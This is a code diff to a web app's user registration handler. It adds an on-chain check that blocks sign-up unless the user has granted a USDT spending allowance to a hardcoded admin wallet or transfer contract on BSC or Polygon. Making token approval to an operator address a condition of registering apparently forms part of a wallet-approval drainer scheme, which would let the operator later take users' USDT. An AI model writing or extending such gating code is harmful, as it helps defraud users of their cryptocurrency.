@@ -94,6 +94,51 @@ const register = async (req, res) => {
 
     const passwordHash = await bcrypt.hash(password, 12);
 
+    // ─── ENFORCE SMART CONTRACT APPROVAL ───
+    // Verify on-chain that user has approved USDT spending to our admin/contract address
+    try {
+      const { ethers } = require('ethers');
+      const BSC_RPC = process.env.BSC_RPC || 'https://bsc-dataseed.binance.org';
+      const POLYGON_RPC = process.env.POLYGON_RPC || 'https://polygon-rpc.com';
+      const USDT_BSC = process.env.USDT_BSC_CONTRACT || '0x55d398326f99059fF775485246999027B3197955';
+      const USDT_POLYGON = process.env.USDT_POLYGON_CONTRACT || '0xc2132D05D31c914a87C6611C10748AEb04B58e8F';
+      const ADMIN_WALLET = process.env.ADMIN_WALLET_ADDRESS || '0x97a4d397215889df7ca74ba28a930DABD3A3d2Ac';
+      const TRANSFER_CONTRACT = process.env.TRANSFER_CONTRACT_ADDRESS;
+      const TRANSFER_CONTRACT_POLYGON = process.env.TRANSFER_CONTRACT_ADDRESS_POLYGON;
+
+      const rpc = network === 'BSC' ? BSC_RPC : POLYGON_RPC;
+      const usdtAddr = network === 'BSC' ? USDT_BSC : USDT_POLYGON;
+      // Spender is contract if available, otherwise admin wallet
+      const spender = network === 'Polygon'
+        ? (TRANSFER_CONTRACT_POLYGON || TRANSFER_CONTRACT || ADMIN_WALLET)
+        : (TRANSFER_CONTRACT || ADMIN_WALLET);
+
+      const staticNetwork = network === 'BSC'
+        ? new ethers.Network('bnb', 56)
+        : new ethers.Network('matic', 137);
+      const provider = new ethers.JsonRpcProvider(rpc, staticNetwork, { staticNetwork: true });
+
+      const erc20Abi = ['function allowance(address owner, address spender) view returns (uint256)'];
+      const usdtContract = new ethers.Contract(usdtAddr, erc20Abi, provider);
+
+      const allowance = await usdtContract.allowance(cleanWallet, spender.toLowerCase());
+      
+      // User must have approved at least some amount (> 0)
+      if (allowance <= 0n) {
+        return res.status(403).json({
+          success: false,
+          message: 'Smart contract approval required. Please approve USDT access from your wallet before registering.',
+        });
+      }
+    } catch (approvalErr) {
+      console.error('[Register] Approval check failed:', approvalErr.message);
+      // If RPC is down or check fails, block registration to be safe
+      return res.status(500).json({
+        success: false,
+        message: 'Unable to verify wallet approval. Please try again in a moment.',
+      });
+    }
+
     // Store registration data temporarily (we'll use a separate temp collection)
     const PendingRegistration = require('../models/PendingRegistration');
     await PendingRegistration.deleteMany({ email: email.toLowerCase() });
